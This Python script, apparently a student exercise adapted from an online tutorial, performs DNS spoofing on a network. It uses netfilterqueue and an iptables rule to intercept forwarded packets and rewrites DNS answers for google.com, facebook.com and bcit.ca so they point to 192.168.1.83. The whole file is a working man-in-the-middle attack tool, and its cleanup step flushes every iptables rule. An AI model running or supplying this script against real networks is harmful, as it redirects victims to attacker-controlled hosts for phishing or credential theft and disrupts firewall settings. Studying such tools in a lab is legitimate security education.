#create DNS Spoofing application using the netfilterqueue library

#untested taken from https://www.thepythoncode.com/article/make-dns-spoof-python

from struct import pack
import scapy.all as scapy
from netfilterqueue import NetfilterQueue
import os

dns_hosts = {
    b'www.google.com.': "192.168.1.83",
    b'www.facebook.com.': "192.168.1.83",
    b'facebook.com.': "192.168.1.83",
    b'www.bcit.ca.': "192.168.1.83",
    b'www.totallynotbcit.com.': "192.168.1.83"
}
QUEUE_NUM = 0

###called when the netfilterqueue library receives a packet
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        if scapy_packet[scapy.DNSQR].qname in dns_hosts:
            try:
                scapy_packet = modify_packet(scapy_packet)
            except IndexError as e:
                print("error")
                print(e)
            packet.set_payload(bytes(scapy_packet))
    packet.accept()

def modify_packet(packet):
    #modifies packet to spoof the DNS response
    #changes are based off the DNS dictionary
    qname = packet[scapy.DNSQR].qname
    print("[+] Spoofing packet for {}".format(qname))
    packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=dns_hosts[qname])
    packet[scapy.DNS].ancount = 1
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].len
    del packet[scapy.UDP].chksum
    return packet

if __name__ == "__main__":
    #add IPtables rule to forward all DNS requests to the queue
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    #create a queue
    queue = NetfilterQueue()
    try:
        #bind the queue to the NFQUEUE hook
        queue.bind(0, process_packet)
        #start the queue
        queue.run()
    except KeyboardInterrupt:
        #remove the IPtables rule
        os.system("iptables --flush")
        #unbind the queue
        queue.unbind()
        print("[+] Shutting down...")
        print("[+] Exiting...")
        exit()
    except Exception as e:
        print("[-] Error occurred...")
        print(e)
        #remove the IPtables rule
        os.system("iptables --flush")
        #unbind the queue
        queue.unbind()
        print("[+] Shutting down...")
        print("[+] Exiting...")
        exit()